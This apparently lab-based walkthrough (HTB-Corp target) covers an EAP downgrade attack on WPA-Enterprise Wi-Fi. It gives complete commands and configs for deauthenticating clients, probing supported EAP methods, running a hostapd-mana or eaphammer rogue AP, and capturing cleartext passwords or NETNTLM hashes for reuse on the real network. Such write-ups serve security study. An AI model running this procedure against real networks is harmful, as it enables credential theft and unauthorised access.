# Chain #27: EAP Downgrade Attack

**Purpose:** Walk through enumerating and executing an EAP downgrade against WPA/WPA2‑Enterprise networks using a two‑NIC setup. You’ll map supported EAP methods, stand up a rogue AP, and coerce clients into weaker inner methods (e.g., GTC or TTLS‑PAP) to capture credentials.

---

## Key Terms

- **802.1X / EAP** – Framework and methods used for WPA‑Enterprise authentication.
    
- **PEAP / TTLS / TLS** – Common outer tunneling methods (inner methods vary: MSCHAPv2, GTC, PAP, CHAP, etc.).
    
- **EAP Downgrade** – Presenting only weaker methods on a rogue AP so clients negotiate down (e.g., to GTC/PAP) and reveal credentials.
    
- **KARMA/MANA** – Rogue AP beacon/probe techniques to attract clients.
    
- **RADIUS** – Backend auth server the real AP uses; we emulate parts on the rogue AP.
    

---

## Step‑by‑Step Workflows

### 1) Interfaces & Setup

- You’ll use **two WLAN interfaces**:
    
    - `wlan0` → **monitor mode** for scan/deauth.
        
    - `wlan1` → **master/AP mode** for the rogue AP.
        

```bash
# Check interfaces
$ iwconfig

# Enable monitor on wlan0
$ sudo airmon-ng start wlan0
```

### 2) Enumerate Target & Client

Scan and capture basic telemetry (BSSID, channel, clients):

```bash
$ airodump-ng wlan0mon -c 1 -w WPA
```

Sample finding:

- Target ESSID: **HTB-Corp**
    
- BSSID: **9C:9A:03:39:BD:7A**
    
- Client STA: **16:C5:68:79:A8:12**
    

If PMK caching is **disabled**, force a reconnect to capture EAP identity:

```bash
$ aireplay-ng -0 3 -a 9C:9A:03:39:BD:7A -c 16:C5:68:79:A8:12 wlan0mon
```

Open the capture in Wireshark (`eap` filter) → find **Response, Identity** (e.g., `HTB\Sentinal`).

### 3) Map Supported EAP Methods (RADIUS side)

Use **EAP‑Buster** with a real identity to see what methods the RADIUS supports for that user:

```bash
$ /opt/EAP_buster/EAP_buster.sh HTB-Corp 'HTB\Sentinal' wlan0mon
```

Example results show support for: `EAP‑TLS, PEAP‑MSCHAPv2, PEAP‑TLS, PEAP‑GTC, TTLS‑PAP, TTLS‑MSCHAPv2, ...`  
This tells you which **weaker inner methods** you can try to coerce (GTC / TTLS‑PAP).

### 4) Attack Path A – hostapd‑mana (manual, fine‑grained)

#### 4.1 Create AP config

`hostapd.conf`:

```ini
# Interface configuration
interface=wlan1
ssid=HTB-Corp
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user

# Mana Configuration
enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1

# Certificate Configuration
ca_cert=ca.pem
server_cert=server.pem
private_key=server-key.pem
dh_file=dh.pem
```

**Notes:**

- `eap_user_file` dictates inner method order (your “downgrade lever”).
    
- `mana_*` enables KARMA/WPE capture and credential logging.
    

#### 4.2 Control negotiation order

`hostapd.eap_user`:

```ini
* TTLS,PEAP,TLS,MD5,GTC
"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5 "challenge1234" [2]
```

This prioritizes **TTLS‑PAP** then **GTC**, falling back to others. The string `challenge1234` will be used during key generation.

#### 4.3 Generate crypto material

```bash
# DH params
$ openssl dhparam -out dh.pem 2048

# CA key & cert
$ openssl genrsa -out ca-key.pem 2048
$ openssl req -new -x509 -nodes -days 100 -key ca-key.pem -out ca.pem

# Server key + CSR (note: produces a key+CSR in same file here)
$ openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server-key.pem
# Sign server cert with CA
$ openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem
```

Match DN fields to the real AP’s cert where possible.

#### 4.4 Launch rogue AP & entice clients

```bash
# Start rogue AP
$ hostapd-mana hostapd.conf

# In another terminal, watch both APs & STAs
$ airodump-ng wlan0mon -c 1

# If needed, push clients off real AP
$ sudo aireplay-ng -0 6 -a 9C:9A:03:39:BD:7A -c 16:C5:68:79:A8:12 wlan0mon
```

**Successful downgrade indicators** (hostapd‑mana output):

- Identity lines (e.g., `MANA EAP Identity Phase 0/1: HTB\Sentinal`).
    
- **GTC** or **TTLS‑PAP** prompts and **cleartext credentials**.
    
- Credentials also logged to `credentials.creds`.
    

### 5) Attack Path B – eaphammer (automated)

#### 5.1 Create certs via wizard

```bash
$ /opt/eaphammer/eaphammer --cert-wizard
```

#### 5.2 Start rogue AP with downgrade strategy

```bash
$ /opt/eaphammer/eaphammer \
  --interface wlan1 \
  --negotiate balanced \
  --auth wpa-eap \
  --essid HTB-Corp \
  --creds
```

- `--negotiate balanced` tries GTC first, then falls back to stronger methods quickly.
    
- If needed, escalate to `--negotiate weakest`.
    

Deauthenticate clients if they don’t roam:

```bash
$ sudo aireplay-ng -0 3 -a 9C:9A:03:39:BD:7A -c 16:C5:68:79:A8:12 wlan0mon
```

**Outputs to expect:**

- First attempt may yield **NETNTLM** (MSCHAPv2) challenge/response lines (hash formats for John/Hashcat).
    
- Subsequent negotiation to **GTC** can reveal **cleartext** credentials.
    

---

## Reference Tables & Snippets

### Minimal Filters / Finds

- Wireshark EAP identity: `eap` → **Response, Identity** frame (e.g., `HTB\Sentinal`).
    
- Handshake/EAPOL only: `eapol`
    

### Common Commands (one‑liners)

```bash
# Fast scan + write capture
airodump-ng wlan0mon -c 1 -w WPA

# Deauth (target AP + STA)
aireplay-ng -0 3 -a <AP_BSSID> -c <STA_MAC> wlan0mon

# EAP method probe
eap_buster.sh <ESSID> '<DOMAIN\User>' wlan0mon
```

### hostapd‑mana knobs (quick meanings)

- `mana_wpe=1` – capture EAP creds/hashes.
    
- `mana_loud=1` – aggressive probe responses (KARMA‑like).
    
- `eap_user_file` – inner method order control (downgrade vector).
    

### Interpreting Loot

- **GTC / TTLS‑PAP** → **username + password in cleartext**.
    
- **PEAP‑MSCHAPv2** → NETNTLM response (crack offline with hashcat/john if needed).
    
- Loot file (mana): `credentials.creds`.
    
- Loot dir (eaphammer): `/opt/eaphammer/loot/…`
    

---

## Summary

1. Enumerate the target AP, clients, and a real username.
    
2. Probe RADIUS with that identity to list supported EAP methods.
    
3. Stand up a rogue AP (hostapd‑mana or eaphammer) that **offers only weak inner methods** first.
    
4. Deauth clients so they negotiate with the rogue AP; capture **cleartext** (GTC/TTLS‑PAP) or crackable hashes (MSCHAPv2).
    
5. Use captured creds to authenticate to the real network or pivot to further attacks.